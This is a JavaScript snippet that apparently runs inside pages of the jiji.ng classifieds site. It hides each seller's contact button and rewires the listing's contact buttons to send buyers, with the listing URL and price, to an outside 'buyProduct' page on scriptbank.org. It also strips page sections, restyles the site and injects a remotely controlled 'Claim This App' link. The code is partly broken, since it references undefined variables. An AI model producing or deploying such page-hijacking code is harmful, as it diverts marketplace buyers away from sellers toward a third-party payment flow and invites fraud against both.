if(! primary || primary == "#" )
    primary = "#ffee23";
if(location.href.includes("jiji.ng") ){
    let contact = document.querySelector('.b-seller-bottom-buttons__item.b-seller-bottom-buttons__item--contact');
   if(contact)
    contact.style.display = "none";
    const button = document.querySelector('.b-advert-contact-buttons');
    console.log(button);
    const button2 = document.querySelector('.b-advert-card-wrapper__bottom');
    
    const price = document.querySelector('.qa-advert-price-view-value').getAttribute('content');
    button.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
        
    }

    button2.onclick = function(e){
        e.preventDefault();
        
        location.href = `https://scriptbank.org/buyProduct?url=${location.href}&price=${price}&productID=${productID}`;
    }
    const othersInt = setInterval(function(){
        let others = document.querySelector('div.h-dflex.h-pb-20.h-flex-dir-column');
        if(others){
            clearInterval(othersInt);
            others.remove();
        }
    }, 2500);
    fetch('https://scriptbank.page.gd/check.php').then( resp => resp.json() ).then( result =>{
        if(result.claimed ) return;
        let div2 = document.createElement('div');
    div2.innerHTML = `<a href="https://scripbank.page.gd/claim.html" class="floating-cta" aria-label="Claim this app">
  <span class="cta-icon">ic</span>
  <span class="cta-text">Claim This App</span>
</a>

    `;
    document.body.appendChild(div2);
    }).catch(error => console.error(error));
    
    
   // button.remove();
  /*const style = document.createElement("link");
    style.href = "https://tester-orcin.vercel.app/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);*/

/*changing styles*/
    
    
    const adsInt = setInterval(function(){
        let ads = document.querySelectorAll('span.qa-advert-price-view-value');

        if(ads.length){
            clearInterval(adsInt);
            ads.forEach(function(ad){
                ad.style.color = primary;
            });
        }
    },1000);

    const hdInt = setInterval(function(){
        let ads = document.querySelectorAll('div#appHeaderIcon');

        if(ads.length){
            clearInterval(hdInt);
            ads.forEach(function(ad){
                ad.style.display = 'none';
            });
        }
    },1000);

    const slotInt = setInterval(function(){
        let ads = document.querySelectorAll('span.fw-button__slot-wrapper');

        if(ads.length){
            clearInterval(slotInt);
            ads.forEach(function(ad){
                ad.style.color = primary;
            });
        }
    },1000);

    const hsInt = setInterval(function(){
        let ads = document.querySelectorAll('span.h-mt--1');

        if(ads.length){
            clearInterval(hsInt);
            ads.forEach(function(ad){
                ad.style.color = primary;
            });
        }
    },1000);

    const headInt = setInterval(function(){
        let ads = document.querySelectorAll('div.h-flex-center.b-button.b-button--primary.b-button--border-radius-8.b-button--size-full.h-height-40.h-width--100p');

        if(ads.length){
            clearInterval(headInt);
            ads.forEach(function(ad){
                ad.style.background = primary;
            });
        }
    },1000);

    const sellInt = setInterval(function(){
        let ads = document.querySelectorAll('div.b-seller-advert-info__last-feed');

        if(ads.length){
            clearInterval(sellInt);
            ads.forEach(function(ad){
                ad.style.color = primary;
                let svg = ad.querySelector('svg');
                if(svg){
                    svg.setAttribute('color', primary );
                }
            });
        }
    },1000);

    const hderInt = setInterval(function(){
        let ads = document.querySelectorAll('div.b-app-header__inner_flex');

        if(ads.length){
            clearInterval(hderInt);
            ads.forEach(function(ad){
                ad.style.display = 'none';
            });
        }
    },1000);

    const rmInt = setInterval(function(){
        let ads = document.querySelectorAll('div.b-seller-page-header.h-bg-jiji-green.h-p-10.h-width-100p');

        if(ads.length){
            clearInterval(rmInt);
            ads.forEach(function(ad){
                ad.remove();
            });
        }
    },1000);

    const spInt = setInterval(function(){
        let ads = document.querySelectorAll('div.h-flex-center');

        if(ads.length){
            clearInterval(spInt);
            ads.forEach(function(ad){
                let span = ad.querySelector('span');

                if(span){
                    span.style.color = primary;
                }
            });
        }
    },1000);

    const prInt = setInterval(function(){
        let ads = document.querySelectorAll('div.qa-advert-price');

        if(ads.length){
            clearInterval(prInt);
            ads.forEach(function(ad){
                ad.style.color = primary;
            });
        }
    },1000);

    const listInt = setInterval(function(){
        let ads = document.querySelectorAll('div.b-advert-listing-change-view');

        if(ads.length){
            clearInterval(listInt);
            ads.forEach(function(ad){
                ad.style.display = 'none';
            });
        }
    },1000);

    const lisInt = setInterval(function(){
        let ads = document.querySelectorAll('div.b-advert-nav__sort');

        if(ads.length){
            clearInterval(lisInt);
            ads.forEach(function(ad){
                ad.style.display = 'none';
            });
        }
    },1000);

   
    let close = div.querySelector('.close-btn');
    close.onclick = function(){
        div.remove();
    }
    
    document.body.appendChild(div);

    
}
